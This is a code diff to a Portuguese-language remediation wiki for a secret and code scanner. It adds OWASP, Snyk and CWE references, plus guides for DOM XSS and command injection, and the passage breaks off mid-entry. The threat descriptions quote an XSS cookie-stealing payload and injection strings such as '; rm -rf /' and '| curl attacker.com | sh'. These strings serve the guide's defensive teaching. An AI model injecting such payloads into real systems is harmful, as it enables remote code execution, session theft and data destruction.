@@ -1,4 +1,6 @@
-import { FindingCategory, SeverityLevel, ScanFinding } from '../types';
+import { FindingCategory, SeverityLevel, ScanFinding, OfficialDocLink } from '../types';
+
+export type { OfficialDocLink };
 
 export interface RemediationStep {
   stepNumber: number;
@@ -12,7 +14,7 @@ export interface RemediationStep {
 export interface RemediationWikiGuide {
   id: string;
   title: string;
-  category: FindingCategory | 'ENDPOINT' | 'ENTROPY';
+  category: FindingCategory | 'ENDPOINT' | 'ENTROPY' | 'TAINT_SINK';
   applicableRuleIds: string[];
   severity: SeverityLevel;
   cvssScore: number;
@@ -25,7 +27,17 @@ export interface RemediationWikiGuide {
     code: string;
     title: string;
     year: string;
+    url: string;
+    cheatSheetTitle?: string;
+    cheatSheetUrl?: string;
   };
+  snyk: {
+    title: string;
+    url: string;
+    learnTopic: string;
+    vulnerabilityId?: string;
+  };
+  officialReferences: OfficialDocLink[];
   summary: string;
   threatScenario: string;
   blastRadius: string;
@@ -61,8 +73,44 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A07:2021',
       title: 'Identification and Authentication Failures',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
+      cheatSheetTitle: 'OWASP Key Management Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Secrets Management & Preventing Hardcoded AWS Keys',
+      url: 'https://snyk.io/learn/secrets-management/',
+      learnTopic: 'Cloud Infrastructure & IAM Secrets Management'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Key Management Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Guia definitivo de gerenciamento do ciclo de vida de chaves criptográficas e credenciais de nuvem.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10: A07:2021 - Identification and Authentication Failures',
+        url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
+        badge: 'OWASP Top 10'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: Secrets Management Best Practices',
+        url: 'https://snyk.io/learn/secrets-management/',
+        badge: 'Snyk Learn Advisory',
+        description: 'Como implementar cofres de segredos, IAM Roles efêmeras e auditoria contínua de repositórios.'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-798: Use of Hard-coded Credentials',
+        url: 'https://cwe.mitre.org/data/definitions/798.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Chaves de acesso permanentes (AKIA...) e segredos da AWS embutidos no código-fonte permitem controle total sobre recursos de nuvem.',
     threatScenario: 'Robôs automatizados varrem repositórios e artefatos em segundos. Com a chave, atacantes provisionam instâncias caras para mineração de criptomoedas, extraem buckets S3 com dados de clientes e criam usuários de persistência.',
     blastRadius: 'Comprometimento total da conta de nuvem, custos financeiros de centenas de milhares de dólares e vazamento de bases de dados.',
@@ -141,8 +189,44 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A01:2021',
       title: 'Broken Access Control',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
+      cheatSheetTitle: 'OWASP Secrets Management Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: API Key Leakage & Hardcoded Credentials',
+      url: 'https://snyk.io/learn/hardcoded-credentials/',
+      learnTopic: 'API Key Exposure & GCP Credential Hardening'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Secrets Management Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Práticas recomendadas para injeção de segredos e isolamento de chaves de API em nuvem.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10: A01:2021 - Broken Access Control',
+        url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
+        badge: 'OWASP Top 10'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: Hardcoded Credentials & API Keys',
+        url: 'https://snyk.io/learn/hardcoded-credentials/',
+        badge: 'Snyk Learn Advisory',
+        description: 'Como mitigar o vazamento acidental de tokens e proteger serviços de inteligência artificial.'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-200: Exposure of Sensitive Information',
+        url: 'https://cwe.mitre.org/data/definitions/200.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Chaves com formato AIza... dão acesso a serviços de IA (Gemini), Maps, Translation e infraestrutura Google Cloud.',
     threatScenario: 'Atacantes usam sua chave para consumir cotas gratuitas e pagas de modelos Gemini Flash/Pro, inflando faturas de IA ou acessando buckets de storage.',
     blastRadius: 'Cobrança excessiva de tokens de LLM, esgotamento de cotas de APIs corporativas e bloqueio do projeto por abuso.',
@@ -204,8 +288,37 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A07:2021',
       title: 'Identification and Authentication Failures',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
+      cheatSheetTitle: 'OWASP Authentication Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Personal Access Token (PAT) Security & CI/CD Pipeline Hardening',
+      url: 'https://snyk.io/learn/ci-cd-security/',
+      learnTopic: 'Source Code Management & CI/CD Security'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Authentication Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Padrões de segurança para tokens de autenticação e proteção contra vazamento em CI/CD.'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: CI/CD Security & GitHub Token Exposure',
+        url: 'https://snyk.io/learn/ci-cd-security/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-522: Insufficiently Protected Credentials',
+        url: 'https://cwe.mitre.org/data/definitions/522.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Tokens com prefixo ghp_ ou github_pat_ concedem acesso a repositórios privados, workflows de CI/CD e pacotes da organização.',
     threatScenario: 'O atacante clona todo o código proprietário da organização, injeta backdoors em branches protegidas ou extrai segredos dos GitHub Actions.',
     blastRadius: 'Vazamento integral de propriedade intelectual corporativa e cadeia de suprimentos (Supply Chain Poisoning).',
@@ -267,8 +380,37 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A01:2021',
       title: 'Broken Access Control',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
+      cheatSheetTitle: 'OWASP Payment Card Industry Data Security Standard (PCI DSS) Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Payment_Card_Industry_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: API Security & Protecting Payment Provider Secrets',
+      url: 'https://snyk.io/learn/api-security/',
+      learnTopic: 'Payment API Security & Secret Exposure'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Payment & PCI DSS Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Payment_Card_Industry_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Diretrizes oficiais para manipulação de tokens e chaves em ambientes de pagamento.'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: API Security Best Practices',
+        url: 'https://snyk.io/learn/api-security/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-312: Cleartext Storage of Sensitive Information',
+        url: 'https://cwe.mitre.org/data/definitions/312.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Chaves com prefixo sk_live_ ou rk_live_ permitem realizar estornos, transferir fundos, criar cobranças e extrair dados de clientes (PII/PCI).',
     threatScenario: 'Um atacante que obtém a sk_live_ pode emitir reembolsos fraudulentos para contas controladas, aplicar golpes de teste de cartões clonados ou baixar relatórios fiscais.',
     blastRadius: 'Prejuízo financeiro direto, multas por violação do padrão PCI-DSS e bloqueio da conta bancária Stripe.',
@@ -330,8 +472,37 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A01:2021',
       title: 'Broken Access Control',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/',
+      cheatSheetTitle: 'OWASP JSON Web Token for Java and JavaScript Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: JSON Web Token (JWT) Vulnerabilities & Security Best Practices',
+      url: 'https://snyk.io/learn/jwt-security-best-practices/',
+      learnTopic: 'JWT Token Hardening & Alg: None Mitigation'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP JSON Web Token Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Diretrizes sobre algoritmos seguros (RS256 vs HS256), validação de expiração e segredos.'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: JWT Security Vulnerabilities',
+        url: 'https://snyk.io/learn/jwt-security-best-practices/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-522: Insufficiently Protected Credentials',
+        url: 'https://cwe.mitre.org/data/definitions/522.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Tokens JWT estáticos assinados incorporados em arquivos contêm claims de usuários e permissões administrativas.',
     threatScenario: 'O atacante extrai o token JWT e usa o cabeçalho Authorization: Bearer para impersonar a conta associada ao sub/role no backend sem precisar de senha ou MFA.',
     blastRadius: 'Acesso completo como o usuário ou administrador dono do token até que este expire ou o segredo de assinatura seja invalidado.',
@@ -393,8 +564,43 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A02:2021',
       title: 'Cryptographic Failures',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
+      cheatSheetTitle: 'OWASP Database Security & SQL Injection Prevention Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Database Security & Preventing Connection String Leaks',
+      url: 'https://snyk.io/learn/sql-injection/',
+      learnTopic: 'Database Security & Connection String Exposure'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Database Security Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Hardening de bancos de dados, criptografia em trânsito (TLS) e autenticação de conexões.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10: A02:2021 - Cryptographic Failures',
+        url: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
+        badge: 'OWASP Top 10'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: Securing Databases & Preventing Data Breaches',
+        url: 'https://snyk.io/learn/sql-injection/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-312: Cleartext Storage of Sensitive Information',
+        url: 'https://cwe.mitre.org/data/definitions/312.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'URIs como postgresql://user:password@host:port/db expõem credenciais de superusuário ou leitura/escrita do banco de dados.',
     threatScenario: 'O atacante se conecta diretamente à porta 5432/27017/3306 do banco de dados na internet, faz download de todas as tabelas, apaga os dados ou instala um ransomware exigindo resgate.',
     blastRadius: 'Vazamento massivo de banco de dados (LGPD/GDPR), paralisação da empresa e perda irreversível de dados.',
@@ -464,8 +670,43 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A02:2021',
       title: 'Cryptographic Failures',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
+      cheatSheetTitle: 'OWASP Cryptographic Storage Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Managing Private Keys & SSH Key Security Guide',
+      url: 'https://snyk.io/learn/ssh-security/',
+      learnTopic: 'PKI & Private Key Exposure'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Cryptographic Storage Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Padrões de armazenamento de chaves assimétricas e gestão do ciclo de vida de certificados.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10: A02:2021 - Cryptographic Failures',
+        url: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
+        badge: 'OWASP Top 10'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: SSH & Private Key Security',
+        url: 'https://snyk.io/learn/ssh-security/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-321: Use of Hard-coded Cryptographic Key',
+        url: 'https://cwe.mitre.org/data/definitions/321.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Blocos com cabeçalhos de chave privada assimétrica (RSA, OPENSSH, PEM) conferem acesso direto a servidores SSH ou capacidade de assinar certificados.',
     threatScenario: 'O atacante faz login como root em servidores de produção via SSH sem senha, decifra pacotes de rede criptografados ou emite certificados TLS falsificados.',
     blastRadius: 'Comprometimento irrestrito de servidores, containers e comunicação segura de toda a infraestrutura corporativa.',
@@ -527,8 +768,43 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A07:2021',
       title: 'Identification and Authentication Failures',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
+      cheatSheetTitle: 'OWASP Password Storage Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Hardcoded Passwords in Source Code & Prevention Patterns',
+      url: 'https://snyk.io/learn/hardcoded-credentials/',
+      learnTopic: 'Password Storage & Plaintext Credential Mitigation'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Password Storage Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Algoritmos modernos de hashing (Argon2id, bcrypt) e proteção contra senhas em código.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10: A07:2021 - Identification & Auth Failures',
+        url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
+        badge: 'OWASP Top 10'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: Hardcoded Credentials & Plaintext Passwords',
+        url: 'https://snyk.io/learn/hardcoded-credentials/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-259: Use of Hard-coded Password',
+        url: 'https://cwe.mitre.org/data/definitions/259.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Atribuições estáticas de strings a variáveis como password, client_secret ou db_pass em arquivos JS/TS.',
     threatScenario: 'Credenciais inseridas provisoriamente durante depuração acabam salvas no repositório, permitindo login direto em painéis ou bancos.',
     blastRadius: 'Acesso não autorizado às contas ou serviços afetados, com possibilidade de movimentação lateral no ambiente interno.',
@@ -590,8 +866,37 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A01:2021',
       title: 'Broken Access Control',
-      year: '2021'
+      year: '2021',
+      url: 'https://genai.owasp.org/llm-top-10/',
+      cheatSheetTitle: 'OWASP Top 10 for Large Language Model Applications (LLM06: Sensitive Information Disclosure)',
+      cheatSheetUrl: 'https://genai.owasp.org/llm-top-10/'
     },
+    snyk: {
+      title: 'Snyk Learn: Generative AI Security & Securing LLM API Keys',
+      url: 'https://snyk.io/learn/ai-security/',
+      learnTopic: 'AI Security & LLM Credential Protection'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10 for LLM Applications',
+        url: 'https://genai.owasp.org/llm-top-10/',
+        badge: 'OWASP GenAI Top 10',
+        description: 'Vulnerabilidades em aplicações baseadas em IA generativa e vazamento de tokens de inferência.'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: AI Security & Model Key Safety',
+        url: 'https://snyk.io/learn/ai-security/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-200: Exposure of Sensitive Information',
+        url: 'https://cwe.mitre.org/data/definitions/200.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Chaves da OpenAI com formato sk-proj-... ou sk-... permitem consumo irrestrito de modelos GPT-4, embeddings e fine-tunes na sua conta.',
     threatScenario: 'Atacantes utilizam sua chave para alimentar bots em massa ou revender acesso a LLMs, gerando faturas de milhares de dólares em poucas horas.',
     blastRadius: 'Prejuízo financeiro direto no cartão de crédito cadastrado na OpenAI e exaustão de cotas de IA da empresa.',
@@ -653,8 +958,37 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A01:2021',
       title: 'Broken Access Control',
-      year: '2021'
+      year: '2021',
+      url: 'https://owasp.org/www-project-api-security/',
+      cheatSheetTitle: 'OWASP REST Security & Authorization Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Broken Object Level Authorization (BOLA) & API Reconnaissance',
+      url: 'https://snyk.io/learn/broken-object-level-authorization-bola/',
+      learnTopic: 'API Security & Endpoint Authorization'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP API Security Project (API1: BOLA / Broken Auth)',
+        url: 'https://owasp.org/www-project-api-security/',
+        badge: 'OWASP API Top 10',
+        description: 'Padrão da indústria para segurança de APIs RESTful e GraphQL contra rotas desprotegidas.'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: BOLA Vulnerabilities in APIs',
+        url: 'https://snyk.io/learn/broken-object-level-authorization-bola/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-285: Improper Authorization',
+        url: 'https://cwe.mitre.org/data/definitions/285.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Caminhos como /api/admin/*, /internal/debug ou /actuator/metrics mapeados no código frontend revelam a topologia interna da API.',
     threatScenario: 'O atacante lê o bundle JavaScript e encontra endpoints não documentados para testar vulnerabilidades de IDOR/BOLA ou obter dados confidenciais sem autenticação.',
     blastRadius: 'Exposição de endpoints operacionais sensíveis, dados analíticos internos e aumento da superfície de ataque.',
@@ -716,8 +1050,37 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
     owasp: {
       code: 'A02:2021',
       title: 'Cryptographic Failures',
-      year: '2021'
+      year: '2021',
+      url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
+      cheatSheetTitle: 'OWASP Secrets Management & Cryptographic Hygiene Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html'
     },
+    snyk: {
+      title: 'Snyk Learn: Shannon Entropy Analysis & Secret Sprawl Defense',
+      url: 'https://snyk.io/learn/secrets-management/',
+      learnTopic: 'Entropy Analysis & Credential Sprawl'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP Secrets Management Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Detecção de strings pseudoaleatórias e blindagem contra vazamento de chaves simétricas.'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: Shannon Entropy in Secret Detection',
+        url: 'https://snyk.io/learn/secrets-management/',
+        badge: 'Snyk Learn'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-312: Cleartext Storage of Sensitive Information',
+        url: 'https://cwe.mitre.org/data/definitions/312.html',
+        badge: 'MITRE CWE'
+      }
+    ],
     summary: 'Sequências aleatórias com entropia superior a 3.5 bits/caractere geralmente representam chaves de criptografia, tokens de sessão ou senhas de integração.',
     threatScenario: 'O atacante identifica o token pseudoaleatório e descobre que ele concede acesso a microsserviços internos, assinaturas de cookies ou webhooks corporativos.',
     blastRadius: 'Varia conforme o segredo identificado; pode comprometer a criptografia simétrica (AES/DES) ou integridade de cookies.',
@@ -763,6 +1126,188 @@ export const REMEDIATION_WIKI_GUIDES: RemediationWikiGuide[] = [
       'Formalize regras customizadas no SecScan para padrões específicos da sua empresa.'
     ],
     tags: ['entropy', 'shannon', 'random', 'secret', 'tokens', 'crypto']
+  },
+  {
+    id: 'sink-xss-dom',
+    title: 'Cross-Site Scripting (XSS) via DOM Sink (innerHTML / dangerouslySetInnerHTML)',
+    category: 'TAINT_SINK',
+    applicableRuleIds: ['sast-sink-xss', 'sec-sink-innerhtml', 'sec-sink-eval'],
+    severity: 'HIGH',
+    cvssScore: 8.8,
+    cwe: {
+      id: 'CWE-79',
+      name: 'Improper Neutralization of Input During Web Page Generation (XSS)',
+      url: 'https://cwe.mitre.org/data/definitions/79.html'
+    },
+    owasp: {
+      code: 'A03:2021',
+      title: 'Injection',
+      year: '2021',
+      url: 'https://owasp.org/Top10/A03_2021-Injection/',
+      cheatSheetTitle: 'OWASP Cross-Site Scripting (XSS) Prevention Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
+    },
+    snyk: {
+      title: 'Snyk Learn: Cross-site Scripting (XSS) Prevention in React & Node.js',
+      url: 'https://snyk.io/learn/xss-cross-site-scripting/',
+      learnTopic: 'DOM-based XSS & Client-side Sanitization'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP XSS Prevention Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Técnicas de codificação contextual (HTML/JS/CSS) e uso de DOMPurify para neutralizar scripts maliciosos.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP DOM based XSS Prevention Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html',
+        badge: 'OWASP DOM XSS'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: What is Cross-Site Scripting (XSS)?',
+        url: 'https://snyk.io/learn/xss-cross-site-scripting/',
+        badge: 'Snyk Learn Advisory',
+        description: 'Vulnerabilidades em templates React, Vue e Angular ao injetar HTML não sanitizado.'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-79: Cross-site Scripting (XSS)',
+        url: 'https://cwe.mitre.org/data/definitions/79.html',
+        badge: 'MITRE CWE'
+      }
+    ],
+    summary: 'Dados de fontes externas (parâmetros de URL, inputs de usuário ou payloads de API) são injetados em sinks do DOM como innerHTML, document.write ou dangerouslySetInnerHTML sem sanitização.',
+    threatScenario: 'O invasor envia um link com payload <script>alert(document.cookie)</script> ou <img src=x onerror=...> que sequestra tokens de sessão e executa ações em nome da vítima.',
+    blastRadius: 'Roubo de sessão de usuários autenticados, redirecionamento para páginas de phishing e defacement da interface web.',
+    stepByStepPatching: [
+      {
+        stepNumber: 1,
+        title: 'Evitar dangerouslySetInnerHTML e innerHTML',
+        description: 'Prefira renderização declarativa nativa do React (ex: {userInput}), que escapa automaticamente caracteres especiais.',
+        commandOrSnippet: `<span>{item.comment}</span> // Seguro por padrão`,
+        commandType: 'typescript',
+        keyTakeaway: 'O React escapa strings por padrão, convertendo tags HTML em texto puro seguro.'
+      },
+      {
+        stepNumber: 2,
+        title: 'Sanitizar com DOMPurify quando HTML for estritamente necessário',
+        description: 'Instale dompurify e sanitize qualquer fragmento HTML antes de repassá-lo ao sink.',
+        commandOrSnippet: `import DOMPurify from 'dompurify';\nconst cleanHtml = DOMPurify.sanitize(dirtyUserInput);`,
+        commandType: 'typescript',
+        keyTakeaway: 'DOMPurify remove scripts, atributos perigosos (onerror, onload) e tags iframe maliciosas.'
+      }
+    ],
+    beforeAfterCode: {
+      language: 'typescript',
+      before: `// ❌ INSEGURO: Injeção direta sem sanitização via sink perigoso\n<div dangerouslySetInnerHTML={{ __html: userFeedback }} />`,
+      after: `// ✅ SEGURO: Sanitização rigorosa via DOMPurify\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userFeedback) }} />`,
+      explanation: 'Sempre purifique o conteúdo antes de inseri-lo em propriedades que interpretam HTML bruto.'
+    },
+    gitHistoryPurge: {
+      command: '# Não requer expurgo de histórico se não envolver segredos comitados.',
+      warning: 'Valide todos os componentes de visualização que recebem dados de formulários ou URLs.'
+    },
+    secretRotationGuide: 'Não se aplica diretamente a vulnerabilidades de código estático.',
+    preventativeMeasures: [
+      'Configure cabeçalho HTTP Content-Security-Policy (CSP) estrito.',
+      'Ative regras de linter react/no-danger e @typescript-eslint/no-implied-eval.'
+    ],
+    tags: ['xss', 'dom', 'injection', 'react', 'dompurify', 'csp', 'sast']
+  },
+  {
+    id: 'sink-command-injection',
+    title: 'Command Injection & Injeção de Processos (exec / spawn / eval)',
+    category: 'TAINT_SINK',
+    applicableRuleIds: ['sast-sink-exec', 'sec-sink-spawn', 'sec-sink-eval'],
+    severity: 'CRITICAL',
+    cvssScore: 9.8,
+    cwe: {
+      id: 'CWE-78',
+      name: 'Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)',
+      url: 'https://cwe.mitre.org/data/definitions/78.html'
+    },
+    owasp: {
+      code: 'A03:2021',
+      title: 'Injection',
+      year: '2021',
+      url: 'https://owasp.org/Top10/A03_2021-Injection/',
+      cheatSheetTitle: 'OWASP OS Command Injection Defense Cheat Sheet',
+      cheatSheetUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html'
+    },
+    snyk: {
+      title: 'Snyk Learn: OS Command Injection in Node.js & Best Practices',
+      url: 'https://snyk.io/learn/command-injection/',
+      learnTopic: 'OS Command Injection & Exec Defense'
+    },
+    officialReferences: [
+      {
+        provider: 'OWASP',
+        title: 'OWASP OS Command Injection Defense Cheat Sheet',
+        url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
+        badge: 'OWASP Cheat Sheet',
+        description: 'Prevenção de execução de comandos do sistema operacional com argumentos parametrizados.'
+      },
+      {
+        provider: 'OWASP',
+        title: 'OWASP Top 10: A03:2021 - Injection',
+        url: 'https://owasp.org/Top10/A03_2021-Injection/',
+        badge: 'OWASP Top 10'
+      },
+      {
+        provider: 'SNYK',
+        title: 'Snyk Learn: Command Injection Vulnerability Guide',
+        url: 'https://snyk.io/learn/command-injection/',
+        badge: 'Snyk Learn Advisory',
+        description: 'Exemplos de como pipelines shell vulneráveis a concatenação de strings levam a Remote Code Execution (RCE).'
+      },
+      {
+        provider: 'CWE',
+        title: 'MITRE CWE-78: OS Command Injection',
+        url: 'https://cwe.mitre.org/data/definitions/78.html',
+        badge: 'MITRE CWE'
+      }
+    ],
+    summary: 'Entrada de dados não confiável concatenada em chamadas de shell (child_process.exec, eval, popen) permite execução remota de código.',
+    threatScenario: 'O invasor injeta operadores de shell (; rm -rf / ou | curl attacker.com | sh) no campo de entrada, assumindo controle total do container ou servidor host.',
+    blastRadius: 'Comprometimento total do host/container, escalonamento de privilégios e pivotamento na rede interna corporativa.',
+    stepByStepPatching: [
+      {
+        stepNumber: 1,
+        title: 'Substituir exec() por execFile() ou spawn() sem shell',
+        description: 'Ao passar argumentos em array (sem invocar /bin/sh), os metacaracteres de shell não são interpretados.',
+        commandOrSnippet: `import { execFile } from 'child_process';\nexecFile('git', ['status', '--porcelain'], (err, stdout) => { ... });`,
+        commandType: 'typescript',
+        keyTakeaway: 'Argumentos em arrays eliminam o risco de concatenação maliciosa de comandos adicionais.'
+      },
+      {
+        stepNumber: 2,
+        title: 'Validar entradas com listas restritas (Whitelisting)',
